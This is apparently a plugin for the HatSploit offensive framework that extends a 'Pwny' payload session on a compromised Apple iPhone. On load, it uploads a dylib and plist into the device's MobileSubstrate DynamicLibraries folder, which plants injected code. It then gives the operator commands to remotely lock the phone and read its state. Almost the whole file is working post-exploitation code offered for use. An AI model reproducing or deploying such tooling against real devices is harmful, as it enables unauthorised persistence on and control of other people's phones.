"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.plugin import Plugin


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Pwny ictl Plugin",
            'Plugin': "ictl",
            'Authors': [
                'Ivan Nikolsky (enty8080) - plugin developer',
            ],
            'Pool': 3,
            'Description': "Plugin called ictl for Apple iOS Pwny.",
        }

        self.pool = {
            self.details['Pool']: {
                'lock': 1,
                'state': 2,
            }
        }

        self.commands = {
            'ictl': {
                'lock': {
                    'Description': "Lock device.",
                    'Usage': "lock",
                    'MinArgs': 0,
                },
                'state': {
                    'Description': "Get device state.",
                    'Usage': "state",
                    'MinArgs': 0,
                }
            }
        }

    def lock(self, argc, argv):
        self.print_process("Requesting iPhone lock...")
        self.session.send_command('lock', pool=self.pool)

    def state(self, argc, argv):
        state = self.session.send_command('state', pool=self.pool)
        self.print_info(f"State: {state}")

    def load(self):
        self.print_process("Loading dylib... (1/2)")

        if not self.session.upload(self.session.pwny_data + 'ictl.dylib', \
                                   '/Library/MobileSubstrate/DynamicLibraries/ictl.dylib'):
            self.print_error("Failed to upload dylib!")

        self.print_process("Loading plist... (2/2)")

        if not self.session.upload(self.session.pwny_data + 'ictl.plist', \
                                   '/Library/MobileSubstrate/DynamicLibraries/ictl.plist'):
            self.print_error("Failed to upload plist!")
